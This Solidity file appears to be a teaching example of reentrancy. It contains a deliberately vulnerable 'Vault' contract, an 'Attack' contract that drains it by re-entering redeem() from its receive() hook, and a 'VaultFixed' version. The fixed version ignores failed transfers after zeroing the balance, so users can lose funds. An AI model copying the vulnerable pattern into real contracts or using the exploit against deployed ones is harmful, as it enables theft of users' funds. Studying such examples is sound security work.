// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

// You can store ETH in this contract and redeem them.
contract Vault {
    mapping(address => uint) public balances;

    /// @dev Store ETH in the contract.
    function store() public payable {
        balances[msg.sender]+=msg.value;
    }
    
    /// @dev Redeem your ETH.
    function redeem() public {
        (bool success, ) = msg.sender.call{ value: balances[msg.sender] }("");
        if (success){
            balances[msg.sender]=0;
        }
    }
}


contract Attack {
    Vault public vault;
 
    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }
 
    // Fallback is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }
 
    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.store{value: 1 ether}();   
        vault.redeem();
    }
 
    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// You can store ETH in this contract and redeem them.
contract VaultFixed {
    mapping(address => uint) public balances;
 
    /// @dev Store ETH in the contract.
    function store() public payable {
        balances[msg.sender]+=msg.value;
    }
    
    /// @dev Redeem your ETH.
    function redeem() public {
        uint toSend = balances[msg.sender];
        balances[msg.sender]=0;
		(bool success, ) = msg.sender.call{ value: toSend }("");
        if(success){
            
        }
    }
}